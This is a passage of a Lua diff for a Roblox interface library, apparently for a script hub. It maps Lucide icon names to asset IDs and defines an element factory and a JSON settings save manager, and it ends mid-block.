+	["lucide-flashlight"] = "rbxassetid://10723376471",
+	["lucide-flashlight-off"] = "rbxassetid://10723376365",
+	["lucide-flask-conical"] = "rbxassetid://10734883986",
+	["lucide-flask-round"] = "rbxassetid://10723376614",
+	["lucide-flip-horizontal"] = "rbxassetid://10723376884",
+	["lucide-flip-horizontal-2"] = "rbxassetid://10723376745",
+	["lucide-flip-vertical"] = "rbxassetid://10723377138",
+	["lucide-flip-vertical-2"] = "rbxassetid://10723377026",
+	["lucide-flower"] = "rbxassetid://10747830374",
+	["lucide-flower-2"] = "rbxassetid://10723377305",
+	["lucide-focus"] = "rbxassetid://10723377537",
+	["lucide-folder"] = "rbxassetid://10723387563",
+	["lucide-folder-archive"] = "rbxassetid://10723384478",
+	["lucide-folder-check"] = "rbxassetid://10723384605",
+	["lucide-folder-clock"] = "rbxassetid://10723384731",
+	["lucide-folder-closed"] = "rbxassetid://10723384893",
+	["lucide-folder-cog"] = "rbxassetid://10723385213",
+	["lucide-folder-cog-2"] = "rbxassetid://10723385036",
+	["lucide-folder-down"] = "rbxassetid://10723385338",
+	["lucide-folder-edit"] = "rbxassetid://10723385445",
+	["lucide-folder-heart"] = "rbxassetid://10723385545",
+	["lucide-folder-input"] = "rbxassetid://10723385721",
+	["lucide-folder-key"] = "rbxassetid://10723385848",
+	["lucide-folder-lock"] = "rbxassetid://10723386005",
+	["lucide-folder-minus"] = "rbxassetid://10723386127",
+	["lucide-folder-open"] = "rbxassetid://10723386277",
+	["lucide-folder-output"] = "rbxassetid://10723386386",
+	["lucide-folder-plus"] = "rbxassetid://10723386531",
+	["lucide-folder-search"] = "rbxassetid://10723386787",
+	["lucide-folder-search-2"] = "rbxassetid://10723386674",
+	["lucide-folder-symlink"] = "rbxassetid://10723386930",
+	["lucide-folder-tree"] = "rbxassetid://10723387085",
+	["lucide-folder-up"] = "rbxassetid://10723387265",
+	["lucide-folder-x"] = "rbxassetid://10723387448",
+	["lucide-folders"] = "rbxassetid://10723387721",
+	["lucide-form-input"] = "rbxassetid://10723387841",
+	["lucide-forward"] = "rbxassetid://10723388016",
+	["lucide-frame"] = "rbxassetid://10723394389",
+	["lucide-framer"] = "rbxassetid://10723394565",
+	["lucide-frown"] = "rbxassetid://10723394681",
+	["lucide-fuel"] = "rbxassetid://10723394846",
+	["lucide-function-square"] = "rbxassetid://10723395041",
+	["lucide-gamepad"] = "rbxassetid://10723395457",
+	["lucide-gamepad-2"] = "rbxassetid://10723395215",
+	["lucide-gauge"] = "rbxassetid://10723395708",
+	["lucide-gavel"] = "rbxassetid://10723395896",
+	["lucide-gem"] = "rbxassetid://10723396000",
+	["lucide-ghost"] = "rbxassetid://10723396107",
+	["lucide-gift"] = "rbxassetid://10723396402",
+	["lucide-gift-card"] = "rbxassetid://10723396225",
+	["lucide-git-branch"] = "rbxassetid://10723396676",
+	["lucide-git-branch-plus"] = "rbxassetid://10723396542",
+	["lucide-git-commit"] = "rbxassetid://10723396812",
+	["lucide-git-compare"] = "rbxassetid://10723396954",
+	["lucide-git-fork"] = "rbxassetid://10723397049",
+	["lucide-git-merge"] = "rbxassetid://10723397165",
+	["lucide-git-pull-request"] = "rbxassetid://10723397431",
+	["lucide-git-pull-request-closed"] = "rbxassetid://10723397268",
+	["lucide-git-pull-request-draft"] = "rbxassetid://10734884302",
+	["lucide-glass"] = "rbxassetid://10723397788",
+	["lucide-glass-2"] = "rbxassetid://10723397529",
+	["lucide-glass-water"] = "rbxassetid://10723397678",
+	["lucide-glasses"] = "rbxassetid://10723397895",
+	["lucide-globe"] = "rbxassetid://10723404337",
+	["lucide-globe-2"] = "rbxassetid://10723398002",
+	["lucide-grab"] = "rbxassetid://10723404472",
+	["lucide-graduation-cap"] = "rbxassetid://10723404691",
+	["lucide-grape"] = "rbxassetid://10723404822",
+	["lucide-grid"] = "rbxassetid://10723404936",
+	["lucide-grip-horizontal"] = "rbxassetid://10723405089",
+	["lucide-grip-vertical"] = "rbxassetid://10723405236",
+	["lucide-hammer"] = "rbxassetid://10723405360",
+	["lucide-hand"] = "rbxassetid://10723405649",
+	["lucide-hand-metal"] = "rbxassetid://10723405508",
+	["lucide-hard-drive"] = "rbxassetid://10723405749",
+	["lucide-hard-hat"] = "rbxassetid://10723405859",
+	["lucide-hash"] = "rbxassetid://10723405975",
+	["lucide-haze"] = "rbxassetid://10723406078",
+	["lucide-headphones"] = "rbxassetid://10723406165",
+	["lucide-heart"] = "rbxassetid://10723406885",
+	["lucide-heart-crack"] = "rbxassetid://10723406299",
+	["lucide-heart-handshake"] = "rbxassetid://10723406480",
+	["lucide-heart-off"] = "rbxassetid://10723406662",
+	["lucide-heart-pulse"] = "rbxassetid://10723406795",
+	["lucide-help-circle"] = "rbxassetid://10723406988",
+	["lucide-hexagon"] = "rbxassetid://10723407092",
+	["lucide-highlighter"] = "rbxassetid://10723407192",
+	["lucide-history"] = "rbxassetid://10723407335",
+	["lucide-home"] = "rbxassetid://10723407389",
+	["lucide-hourglass"] = "rbxassetid://10723407498",
+	["lucide-ice-cream"] = "rbxassetid://10723414308",
+	["lucide-image"] = "rbxassetid://10723415040",
+	["lucide-image-minus"] = "rbxassetid://10723414487",
+	["lucide-image-off"] = "rbxassetid://10723414677",
+	["lucide-image-plus"] = "rbxassetid://10723414827",
+	["lucide-import"] = "rbxassetid://10723415205",
+	["lucide-inbox"] = "rbxassetid://10723415335",
+	["lucide-indent"] = "rbxassetid://10723415494",
+	["lucide-indian-rupee"] = "rbxassetid://10723415642",
+	["lucide-infinity"] = "rbxassetid://10723415766",
+	["lucide-info"] = "rbxassetid://10723415903",
+	["lucide-inspect"] = "rbxassetid://10723416057",
+	["lucide-italic"] = "rbxassetid://10723416195",
+	["lucide-japanese-yen"] = "rbxassetid://10723416363",
+	["lucide-joystick"] = "rbxassetid://10723416527",
+	["lucide-key"] = "rbxassetid://10723416652",
+	["lucide-keyboard"] = "rbxassetid://10723416765",
+	["lucide-lamp"] = "rbxassetid://10723417513",
+	["lucide-lamp-ceiling"] = "rbxassetid://10723416922",
+	["lucide-lamp-desk"] = "rbxassetid://10723417016",
+	["lucide-lamp-floor"] = "rbxassetid://10723417131",
+	["lucide-lamp-wall-down"] = "rbxassetid://10723417240",
+	["lucide-lamp-wall-up"] = "rbxassetid://10723417356",
+	["lucide-landmark"] = "rbxassetid://10723417608",
+	["lucide-languages"] = "rbxassetid://10723417703",
+	["lucide-laptop"] = "rbxassetid://10723423881",
+	["lucide-laptop-2"] = "rbxassetid://10723417797",
+	["lucide-lasso"] = "rbxassetid://10723424235",
+	["lucide-lasso-select"] = "rbxassetid://10723424058",
+	["lucide-laugh"] = "rbxassetid://10723424372",
+	["lucide-layers"] = "rbxassetid://10723424505",
+	["lucide-layout"] = "rbxassetid://10723425376",
+	["lucide-layout-dashboard"] = "rbxassetid://10723424646",
+	["lucide-layout-grid"] = "rbxassetid://10723424838",
+	["lucide-layout-list"] = "rbxassetid://10723424963",
+	["lucide-layout-template"] = "rbxassetid://10723425187",
+	["lucide-leaf"] = "rbxassetid://10723425539",
+	["lucide-library"] = "rbxassetid://10723425615",
+	["lucide-life-buoy"] = "rbxassetid://10723425685",
+	["lucide-lightbulb"] = "rbxassetid://10723425852",
+	["lucide-lightbulb-off"] = "rbxassetid://10723425762",
+	["lucide-line-chart"] = "rbxassetid://10723426393",
+	["lucide-link"] = "rbxassetid://10723426722",
+	["lucide-link-2"] = "rbxassetid://10723426595",
+	["lucide-link-2-off"] = "rbxassetid://10723426513",
+	["lucide-list"] = "rbxassetid://10723433811",
+	["lucide-list-checks"] = "rbxassetid://10734884548",
+	["lucide-list-end"] = "rbxassetid://10723426886",
+	["lucide-list-minus"] = "rbxassetid://10723426986",
+	["lucide-list-music"] = "rbxassetid://10723427081",
+	["lucide-list-ordered"] = "rbxassetid://10723427199",
+	["lucide-list-plus"] = "rbxassetid://10723427334",
+	["lucide-list-start"] = "rbxassetid://10723427494",
+	["lucide-list-video"] = "rbxassetid://10723427619",
+	["lucide-list-todo"] = "rbxassetid://17376008003",
+	["lucide-list-x"] = "rbxassetid://10723433655",
+	["lucide-loader"] = "rbxassetid://10723434070",
+	["lucide-loader-2"] = "rbxassetid://10723433935",
+	["lucide-locate"] = "rbxassetid://10723434557",
+	["lucide-locate-fixed"] = "rbxassetid://10723434236",
+	["lucide-locate-off"] = "rbxassetid://10723434379",
+	["lucide-lock"] = "rbxassetid://10723434711",
+	["lucide-log-in"] = "rbxassetid://10723434830",
+	["lucide-log-out"] = "rbxassetid://10723434906",
+	["lucide-luggage"] = "rbxassetid://10723434993",
+	["lucide-magnet"] = "rbxassetid://10723435069",
+	["lucide-mail"] = "rbxassetid://10734885430",
+	["lucide-mail-check"] = "rbxassetid://10723435182",
+	["lucide-mail-minus"] = "rbxassetid://10723435261",
+	["lucide-mail-open"] = "rbxassetid://10723435342",
+	["lucide-mail-plus"] = "rbxassetid://10723435443",
+	["lucide-mail-question"] = "rbxassetid://10723435515",
+	["lucide-mail-search"] = "rbxassetid://10734884739",
+	["lucide-mail-warning"] = "rbxassetid://10734885015",
+	["lucide-mail-x"] = "rbxassetid://10734885247",
+	["lucide-mails"] = "rbxassetid://10734885614",
+	["lucide-map"] = "rbxassetid://10734886202",
+	["lucide-map-pin"] = "rbxassetid://10734886004",
+	["lucide-map-pin-off"] = "rbxassetid://10734885803",
+	["lucide-maximize"] = "rbxassetid://10734886735",
+	["lucide-maximize-2"] = "rbxassetid://10734886496",
+	["lucide-medal"] = "rbxassetid://10734887072",
+	["lucide-megaphone"] = "rbxassetid://10734887454",
+	["lucide-megaphone-off"] = "rbxassetid://10734887311",
+	["lucide-meh"] = "rbxassetid://10734887603",
+	["lucide-menu"] = "rbxassetid://10734887784",
+	["lucide-message-circle"] = "rbxassetid://10734888000",
+	["lucide-message-square"] = "rbxassetid://10734888228",
+	["lucide-mic"] = "rbxassetid://10734888864",
+	["lucide-mic-2"] = "rbxassetid://10734888430",
+	["lucide-mic-off"] = "rbxassetid://10734888646",
+	["lucide-microscope"] = "rbxassetid://10734889106",
+	["lucide-microwave"] = "rbxassetid://10734895076",
+	["lucide-milestone"] = "rbxassetid://10734895310",
+	["lucide-minimize"] = "rbxassetid://10734895698",
+	["lucide-minimize-2"] = "rbxassetid://10734895530",
+	["lucide-minus"] = "rbxassetid://10734896206",
+	["lucide-minus-circle"] = "rbxassetid://10734895856",
+	["lucide-minus-square"] = "rbxassetid://10734896029",
+	["lucide-monitor"] = "rbxassetid://10734896881",
+	["lucide-monitor-off"] = "rbxassetid://10734896360",
+	["lucide-monitor-speaker"] = "rbxassetid://10734896512",
+	["lucide-moon"] = "rbxassetid://10734897102",
+	["lucide-more-horizontal"] = "rbxassetid://10734897250",
+	["lucide-more-vertical"] = "rbxassetid://10734897387",
+	["lucide-mountain"] = "rbxassetid://10734897956",
+	["lucide-mountain-snow"] = "rbxassetid://10734897665",
+	["lucide-mouse"] = "rbxassetid://10734898592",
+	["lucide-mouse-pointer"] = "rbxassetid://10734898476",
+	["lucide-mouse-pointer-2"] = "rbxassetid://10734898194",
+	["lucide-mouse-pointer-click"] = "rbxassetid://10734898355",
+	["lucide-move"] = "rbxassetid://10734900011",
+	["lucide-move-3d"] = "rbxassetid://10734898756",
+	["lucide-move-diagonal"] = "rbxassetid://10734899164",
+	["lucide-move-diagonal-2"] = "rbxassetid://10734898934",
+	["lucide-move-horizontal"] = "rbxassetid://10734899414",
+	["lucide-move-vertical"] = "rbxassetid://10734899821",
+	["lucide-music"] = "rbxassetid://10734905958",
+	["lucide-music-2"] = "rbxassetid://10734900215",
+	["lucide-music-3"] = "rbxassetid://10734905665",
+	["lucide-music-4"] = "rbxassetid://10734905823",
+	["lucide-navigation"] = "rbxassetid://10734906744",
+	["lucide-navigation-2"] = "rbxassetid://10734906332",
+	["lucide-navigation-2-off"] = "rbxassetid://10734906144",
+	["lucide-navigation-off"] = "rbxassetid://10734906580",
+	["lucide-network"] = "rbxassetid://10734906975",
+	["lucide-newspaper"] = "rbxassetid://10734907168",
+	["lucide-octagon"] = "rbxassetid://10734907361",
+	["lucide-option"] = "rbxassetid://10734907649",
+	["lucide-outdent"] = "rbxassetid://10734907933",
+	["lucide-package"] = "rbxassetid://10734909540",
+	["lucide-package-2"] = "rbxassetid://10734908151",
+	["lucide-package-check"] = "rbxassetid://10734908384",
+	["lucide-package-minus"] = "rbxassetid://10734908626",
+	["lucide-package-open"] = "rbxassetid://10734908793",
+	["lucide-package-plus"] = "rbxassetid://10734909016",
+	["lucide-package-search"] = "rbxassetid://10734909196",
+	["lucide-package-x"] = "rbxassetid://10734909375",
+	["lucide-paint-bucket"] = "rbxassetid://10734909847",
+	["lucide-paintbrush"] = "rbxassetid://10734910187",
+	["lucide-paintbrush-2"] = "rbxassetid://10734910030",
+	["lucide-palette"] = "rbxassetid://10734910430",
+	["lucide-palmtree"] = "rbxassetid://10734910680",
+	["lucide-paperclip"] = "rbxassetid://10734910927",
+	["lucide-party-popper"] = "rbxassetid://10734918735",
+	["lucide-pause"] = "rbxassetid://10734919336",
+	["lucide-pause-circle"] = "rbxassetid://10735024209",
+	["lucide-pause-octagon"] = "rbxassetid://10734919143",
+	["lucide-pen-tool"] = "rbxassetid://10734919503",
+	["lucide-pencil"] = "rbxassetid://10734919691",
+	["lucide-percent"] = "rbxassetid://10734919919",
+	["lucide-person-standing"] = "rbxassetid://10734920149",
+	["lucide-phone"] = "rbxassetid://10734921524",
+	["lucide-phone-call"] = "rbxassetid://10734920305",
+	["lucide-phone-forwarded"] = "rbxassetid://10734920508",
+	["lucide-phone-incoming"] = "rbxassetid://10734920694",
+	["lucide-phone-missed"] = "rbxassetid://10734920845",
+	["lucide-phone-off"] = "rbxassetid://10734921077",
+	["lucide-phone-outgoing"] = "rbxassetid://10734921288",
+	["lucide-pie-chart"] = "rbxassetid://10734921727",
+	["lucide-piggy-bank"] = "rbxassetid://10734921935",
+	["lucide-pin"] = "rbxassetid://10734922324",
+	["lucide-pin-off"] = "rbxassetid://10734922180",
+	["lucide-pipette"] = "rbxassetid://10734922497",
+	["lucide-pizza"] = "rbxassetid://10734922774",
+	["lucide-plane"] = "rbxassetid://10734922971",
+	["lucide-plane-landing"] = "rbxassetid://17376029914",
+	["lucide-play"] = "rbxassetid://10734923549",
+	["lucide-play-circle"] = "rbxassetid://10734923214",
+	["lucide-plus"] = "rbxassetid://10734924532",
+	["lucide-plus-circle"] = "rbxassetid://10734923868",
+	["lucide-plus-square"] = "rbxassetid://10734924219",
+	["lucide-podcast"] = "rbxassetid://10734929553",
+	["lucide-pointer"] = "rbxassetid://10734929723",
+	["lucide-pound-sterling"] = "rbxassetid://10734929981",
+	["lucide-power"] = "rbxassetid://10734930466",
+	["lucide-power-off"] = "rbxassetid://10734930257",
+	["lucide-printer"] = "rbxassetid://10734930632",
+	["lucide-puzzle"] = "rbxassetid://10734930886",
+	["lucide-quote"] = "rbxassetid://10734931234",
+	["lucide-radio"] = "rbxassetid://10734931596",
+	["lucide-radio-receiver"] = "rbxassetid://10734931402",
+	["lucide-rectangle-horizontal"] = "rbxassetid://10734931777",
+	["lucide-rectangle-vertical"] = "rbxassetid://10734932081",
+	["lucide-recycle"] = "rbxassetid://10734932295",
+	["lucide-redo"] = "rbxassetid://10734932822",
+	["lucide-redo-2"] = "rbxassetid://10734932586",
+	["lucide-refresh-ccw"] = "rbxassetid://10734933056",
+	["lucide-refresh-cw"] = "rbxassetid://10734933222",
+	["lucide-refrigerator"] = "rbxassetid://10734933465",
+	["lucide-regex"] = "rbxassetid://10734933655",
+	["lucide-repeat"] = "rbxassetid://10734933966",
+	["lucide-repeat-1"] = "rbxassetid://10734933826",
+	["lucide-reply"] = "rbxassetid://10734934252",
+	["lucide-reply-all"] = "rbxassetid://10734934132",
+	["lucide-rewind"] = "rbxassetid://10734934347",
+	["lucide-rocket"] = "rbxassetid://10734934585",
+	["lucide-rocking-chair"] = "rbxassetid://10734939942",
+	["lucide-rotate-3d"] = "rbxassetid://10734940107",
+	["lucide-rotate-ccw"] = "rbxassetid://10734940376",
+	["lucide-rotate-cw"] = "rbxassetid://10734940654",
+	["lucide-rss"] = "rbxassetid://10734940825",
+	["lucide-ruler"] = "rbxassetid://10734941018",
+	["lucide-russian-ruble"] = "rbxassetid://10734941199",
+	["lucide-sailboat"] = "rbxassetid://10734941354",
+	["lucide-save"] = "rbxassetid://10734941499",
+	["lucide-scale"] = "rbxassetid://10734941912",
+	["lucide-scale-3d"] = "rbxassetid://10734941739",
+	["lucide-scaling"] = "rbxassetid://10734942072",
+	["lucide-scan"] = "rbxassetid://10734942565",
+	["lucide-scan-face"] = "rbxassetid://10734942198",
+	["lucide-scan-line"] = "rbxassetid://10734942351",
+	["lucide-scissors"] = "rbxassetid://10734942778",
+	["lucide-screen-share"] = "rbxassetid://10734943193",
+	["lucide-screen-share-off"] = "rbxassetid://10734942967",
+	["lucide-scroll"] = "rbxassetid://10734943448",
+	["lucide-search"] = "rbxassetid://10734943674",
+	["lucide-send"] = "rbxassetid://10734943902",
+	["lucide-separator-horizontal"] = "rbxassetid://10734944115",
+	["lucide-separator-vertical"] = "rbxassetid://10734944326",
+	["lucide-server"] = "rbxassetid://10734949856",
+	["lucide-server-cog"] = "rbxassetid://10734944444",
+	["lucide-server-crash"] = "rbxassetid://10734944554",
+	["lucide-server-off"] = "rbxassetid://10734944668",
+	["lucide-settings"] = "rbxassetid://10734950309",
+	["lucide-settings-2"] = "rbxassetid://10734950020",
+	["lucide-share"] = "rbxassetid://10734950813",
+	["lucide-share-2"] = "rbxassetid://10734950553",
+	["lucide-sheet"] = "rbxassetid://10734951038",
+	["lucide-shield"] = "rbxassetid://10734951847",
+	["lucide-shield-alert"] = "rbxassetid://10734951173",
+	["lucide-shield-check"] = "rbxassetid://10734951367",
+	["lucide-shield-close"] = "rbxassetid://10734951535",
+	["lucide-shield-off"] = "rbxassetid://10734951684",
+	["lucide-shirt"] = "rbxassetid://10734952036",
+	["lucide-shopping-bag"] = "rbxassetid://10734952273",
+	["lucide-shopping-cart"] = "rbxassetid://10734952479",
+	["lucide-shovel"] = "rbxassetid://10734952773",
+	["lucide-shower-head"] = "rbxassetid://10734952942",
+	["lucide-shrink"] = "rbxassetid://10734953073",
+	["lucide-shrub"] = "rbxassetid://10734953241",
+	["lucide-shuffle"] = "rbxassetid://10734953451",
+	["lucide-sidebar"] = "rbxassetid://10734954301",
+	["lucide-sidebar-close"] = "rbxassetid://10734953715",
+	["lucide-sidebar-open"] = "rbxassetid://10734954000",
+	["lucide-sigma"] = "rbxassetid://10734954538",
+	["lucide-signal"] = "rbxassetid://10734961133",
+	["lucide-signal-high"] = "rbxassetid://10734954807",
+	["lucide-signal-low"] = "rbxassetid://10734955080",
+	["lucide-signal-medium"] = "rbxassetid://10734955336",
+	["lucide-signal-zero"] = "rbxassetid://10734960878",
+	["lucide-siren"] = "rbxassetid://10734961284",
+	["lucide-skip-back"] = "rbxassetid://10734961526",
+	["lucide-skip-forward"] = "rbxassetid://10734961809",
+	["lucide-skull"] = "rbxassetid://10734962068",
+	["lucide-slack"] = "rbxassetid://10734962339",
+	["lucide-slash"] = "rbxassetid://10734962600",
+	["lucide-slice"] = "rbxassetid://10734963024",
+	["lucide-sliders"] = "rbxassetid://10734963400",
+	["lucide-sliders-horizontal"] = "rbxassetid://10734963191",
+	["lucide-smartphone"] = "rbxassetid://10734963940",
+	["lucide-smartphone-charging"] = "rbxassetid://10734963671",
+	["lucide-smile"] = "rbxassetid://10734964441",
+	["lucide-smile-plus"] = "rbxassetid://10734964188",
+	["lucide-snowflake"] = "rbxassetid://10734964600",
+	["lucide-sofa"] = "rbxassetid://10734964852",
+	["lucide-sort-asc"] = "rbxassetid://10734965115",
+	["lucide-sort-desc"] = "rbxassetid://10734965287",
+	["lucide-speaker"] = "rbxassetid://10734965419",
+	["lucide-sprout"] = "rbxassetid://10734965572",
+	["lucide-square"] = "rbxassetid://10734965702",
+	["lucide-star"] = "rbxassetid://10734966248",
+	["lucide-star-half"] = "rbxassetid://10734965897",
+	["lucide-star-off"] = "rbxassetid://10734966097",
+	["lucide-stethoscope"] = "rbxassetid://10734966384",
+	["lucide-sticker"] = "rbxassetid://10734972234",
+	["lucide-sticky-note"] = "rbxassetid://10734972463",
+	["lucide-stop-circle"] = "rbxassetid://10734972621",
+	["lucide-stretch-horizontal"] = "rbxassetid://10734972862",
+	["lucide-stretch-vertical"] = "rbxassetid://10734973130",
+	["lucide-strikethrough"] = "rbxassetid://10734973290",
+	["lucide-subscript"] = "rbxassetid://10734973457",
+	["lucide-sun"] = "rbxassetid://10734974297",
+	["lucide-sun-dim"] = "rbxassetid://10734973645",
+	["lucide-sun-medium"] = "rbxassetid://10734973778",
+	["lucide-sun-moon"] = "rbxassetid://10734973999",
+	["lucide-sun-snow"] = "rbxassetid://10734974130",
+	["lucide-sunrise"] = "rbxassetid://10734974522",
+	["lucide-sunset"] = "rbxassetid://10734974689",
+	["lucide-superscript"] = "rbxassetid://10734974850",
+	["lucide-swiss-franc"] = "rbxassetid://10734975024",
+	["lucide-switch-camera"] = "rbxassetid://10734975214",
+	["lucide-sword"] = "rbxassetid://10734975486",
+	["lucide-swords"] = "rbxassetid://10734975692",
+	["lucide-syringe"] = "rbxassetid://10734975932",
+	["lucide-table"] = "rbxassetid://10734976230",
+	["lucide-table-2"] = "rbxassetid://10734976097",
+	["lucide-tablet"] = "rbxassetid://10734976394",
+	["lucide-tag"] = "rbxassetid://10734976528",
+	["lucide-tags"] = "rbxassetid://10734976739",
+	["lucide-target"] = "rbxassetid://10734977012",
+	["lucide-tent"] = "rbxassetid://10734981750",
+	["lucide-terminal"] = "rbxassetid://10734982144",
+	["lucide-terminal-square"] = "rbxassetid://10734981995",
+	["lucide-text-cursor"] = "rbxassetid://10734982395",
+	["lucide-text-cursor-input"] = "rbxassetid://10734982297",
+	["lucide-thermometer"] = "rbxassetid://10734983134",
+	["lucide-thermometer-snowflake"] = "rbxassetid://10734982571",
+	["lucide-thermometer-sun"] = "rbxassetid://10734982771",
+	["lucide-thumbs-down"] = "rbxassetid://10734983359",
+	["lucide-thumbs-up"] = "rbxassetid://10734983629",
+	["lucide-ticket"] = "rbxassetid://10734983868",
+	["lucide-timer"] = "rbxassetid://10734984606",
+	["lucide-timer-off"] = "rbxassetid://10734984138",
+	["lucide-timer-reset"] = "rbxassetid://10734984355",
+	["lucide-toggle-left"] = "rbxassetid://10734984834",
+	["lucide-toggle-right"] = "rbxassetid://10734985040",
+	["lucide-tornado"] = "rbxassetid://10734985247",
+	["lucide-toy-brick"] = "rbxassetid://10747361919",
+	["lucide-train"] = "rbxassetid://10747362105",
+	["lucide-trash"] = "rbxassetid://10747362393",
+	["lucide-trash-2"] = "rbxassetid://10747362241",
+	["lucide-tree-deciduous"] = "rbxassetid://10747362534",
+	["lucide-tree-pine"] = "rbxassetid://10747362748",
+	["lucide-trees"] = "rbxassetid://10747363016",
+	["lucide-trending-down"] = "rbxassetid://10747363205",
+	["lucide-trending-up"] = "rbxassetid://10747363465",
+	["lucide-triangle"] = "rbxassetid://10747363621",
+	["lucide-trophy"] = "rbxassetid://10747363809",
+	["lucide-truck"] = "rbxassetid://10747364031",
+	["lucide-tv"] = "rbxassetid://10747364593",
+	["lucide-tv-2"] = "rbxassetid://10747364302",
+	["lucide-type"] = "rbxassetid://10747364761",
+	["lucide-umbrella"] = "rbxassetid://10747364971",
+	["lucide-underline"] = "rbxassetid://10747365191",
+	["lucide-undo"] = "rbxassetid://10747365484",
+	["lucide-undo-2"] = "rbxassetid://10747365359",
+	["lucide-unlink"] = "rbxassetid://10747365771",
+	["lucide-unlink-2"] = "rbxassetid://10747397871",
+	["lucide-unlock"] = "rbxassetid://10747366027",
+	["lucide-upload"] = "rbxassetid://10747366434",
+	["lucide-upload-cloud"] = "rbxassetid://10747366266",
+	["lucide-usb"] = "rbxassetid://10747366606",
+	["lucide-user"] = "rbxassetid://10747373176",
+	["lucide-user-check"] = "rbxassetid://10747371901",
+	["lucide-user-cog"] = "rbxassetid://10747372167",
+	["lucide-user-minus"] = "rbxassetid://10747372346",
+	["lucide-user-plus"] = "rbxassetid://10747372702",
+	["lucide-user-x"] = "rbxassetid://10747372992",
+	["lucide-users"] = "rbxassetid://10747373426",
+	["lucide-utensils"] = "rbxassetid://10747373821",
+	["lucide-utensils-crossed"] = "rbxassetid://10747373629",
+	["lucide-venetian-mask"] = "rbxassetid://10747374003",
+	["lucide-verified"] = "rbxassetid://10747374131",
+	["lucide-vibrate"] = "rbxassetid://10747374489",
+	["lucide-vibrate-off"] = "rbxassetid://10747374269",
+	["lucide-video"] = "rbxassetid://10747374938",
+	["lucide-video-off"] = "rbxassetid://10747374721",
+	["lucide-view"] = "rbxassetid://10747375132",
+	["lucide-voicemail"] = "rbxassetid://10747375281",
+	["lucide-volume"] = "rbxassetid://10747376008",
+	["lucide-volume-1"] = "rbxassetid://10747375450",
+	["lucide-volume-2"] = "rbxassetid://10747375679",
+	["lucide-volume-x"] = "rbxassetid://10747375880",
+	["lucide-wheat"] = "rbxassetid://80877624162595",
+	["lucide-wallet"] = "rbxassetid://10747376205",
+	["lucide-wand"] = "rbxassetid://10747376565",
+	["lucide-wand-2"] = "rbxassetid://10747376349",
+	["lucide-watch"] = "rbxassetid://10747376722",
+	["lucide-waves"] = "rbxassetid://10747376931",
+	["lucide-webcam"] = "rbxassetid://10747381992",
+	["lucide-wifi"] = "rbxassetid://10747382504",
+	["lucide-wifi-off"] = "rbxassetid://10747382268",
+	["lucide-wind"] = "rbxassetid://10747382750",
+	["lucide-wrap-text"] = "rbxassetid://10747383065",
+	["lucide-wrench"] = "rbxassetid://10747383470",
+	["lucide-x"] = "rbxassetid://10747384394",
+	["lucide-x-circle"] = "rbxassetid://10747383819",
+	["lucide-x-octagon"] = "rbxassetid://10747384037",
+	["lucide-x-square"] = "rbxassetid://10747384217",
+	["lucide-zoom-in"] = "rbxassetid://10747384552",
+	["lucide-zoom-out"] = "rbxassetid://10747384679",
+	["lucide-cat"] = "rbxassetid://16935650691",
+	["lucide-message-circle-question"] = "rbxassetid://16970049192",
+	["lucide-webhook"] = "rbxassetid://17320556264",
+	["lucide-dumbbell"] = "rbxassetid://18273453053"
+}
+function Library:GetIcon(Name)
+	if Name ~= nil and Icons["lucide-" .. Name] then
+		return Icons["lucide-" .. Name]
+	end
+	return nil
+end
+
+local Elements = {}
+Elements.__index = Elements
+Elements.__namecall = function(Table, Key, ...)
+	return Elements[Key](...)
+end
+
+for _, ElementComponent in pairs(ElementsTable) do
+	Elements["Add" .. ElementComponent.__type] = function(self, Idx, Config)
+		ElementComponent.Container = self.Container
+		ElementComponent.Type = self.Type
+		ElementComponent.ScrollFrame = self.ScrollFrame
+		ElementComponent.Library = Library
+
+		return ElementComponent:New(Idx, Config)
+	end
+end
+
+Library.Elements = Elements
+
+if RunService:IsStudio() then
+	makefolder = function(...) return ... end;
+	makefile = function(...) return ... end;
+	isfile = function(...) return ... end;
+	isfolder = function(...) return ... end;
+	readfile = function(...) return ... end;
+	writefile = function(...) return ... end;
+	listfiles = function (...) return {...} end;
+end
+
+local SaveManager = {} do
+	SaveManager.Folder = "DoriHubSettings"
+	SaveManager.Ignore = {}
+	SaveManager.Parser = {
+		Toggle = {
+			Save = function(idx, object) 
+				return { type = "Toggle", idx = idx, value = object.Value } 
+			end,
+			Load = function(idx, data)
+				if SaveManager.Options[idx] then 
+					SaveManager.Options[idx]:SetValue(data.value)
+				end
+			end,
+		},
+		Slider = {
+			Save = function(idx, object)
+				return { type = "Slider", idx = idx, value = tostring(object.Value) }
+			end,
+			Load = function(idx, data)
+				if SaveManager.Options[idx] then 
+					SaveManager.Options[idx]:SetValue(data.value)
+				end
+			end,
+		},
+		Dropdown = {
+			Save = function(idx, object)
+				return { type = "Dropdown", idx = idx, value = object.Value, mutli = object.Multi }
+			end,
+			Load = function(idx, data)
+				if SaveManager.Options[idx] then 
+					SaveManager.Options[idx]:SetValue(data.value)
+				end
+			end,
+		},
+		Colorpicker = {
+			Save = function(idx, object)
+				return { type = "Colorpicker", idx = idx, value = object.Value:ToHex(), transparency = object.Transparency }
+			end,
+			Load = function(idx, data)
+				if SaveManager.Options[idx] then 
+					SaveManager.Options[idx]:SetValueRGB(Color3.fromHex(data.value), data.transparency)
+				end
+			end,
+		},
+		Keybind = {
+			Save = function(idx, object)
+				return { type = "Keybind", idx = idx, mode = object.Mode, key = object.Value }
+			end,
+			Load = function(idx, data)
+				if SaveManager.Options[idx] then 
+					SaveManager.Options[idx]:SetValue(data.key, data.mode)
+				end
+			end,
+		},
+
+		Input = {
+			Save = function(idx, object)
+				return { type = "Input", idx = idx, text = object.Value }
+			end,
+			Load = function(idx, data)
+				if SaveManager.Options[idx] and type(data.text) == "string" then
+					SaveManager.Options[idx]:SetValue(data.text)
+				end
+			end,
+		},
+	}
+
+	function SaveManager:SetIgnoreIndexes(list)
+		for _, key in next, list do
+			self.Ignore[key] = true
+		end
+	end
+	function SaveManager:SetFolder(folder)
+		self.Folder = folder;
+		self:BuildFolderTree()
+	end
+
+	function SaveManager:Save(name)
+		if (not name) then
+			return false, "no config file is selected"
+		end
+
+		local fullPath = self.Folder .. "/" .. name .. ".json"
+
+		local data = {
+			objects = {}
+		}
+
+
+		for idx, option in next, SaveManager.Options do
+			if self.Parser[option.Type] and not self.Ignore[idx] then
+				table.insert(data.objects, self.Parser[option.Type].Save(idx, option))
+			end
+		end	
+
+		local success, encoded = pcall(httpService.JSONEncode, httpService, data)
+		if not success then
+			return false, "failed to encode data"
+		end
+
+		writefile(fullPath, encoded)
+		return true
+	end
+
+	if not RunService:IsStudio() then
